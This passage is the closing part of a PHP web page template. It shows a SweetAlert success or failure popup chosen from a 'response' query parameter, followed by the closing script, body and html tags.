    <?php if(isset($_GET['response'])): ?>
    Swal.fire({ icon: '<?= $_GET['response']=="success"?"success":"error" ?>', title: '<?= $_GET['response']=="success"?"Success":"Failed" ?>', text: '<?= $_GET['response']=="success"?"Operation completed.":"Something went wrong." ?>', confirmButtonColor: '#22242d' });
    <?php endif; ?>
});
</script>
</body>
</html>
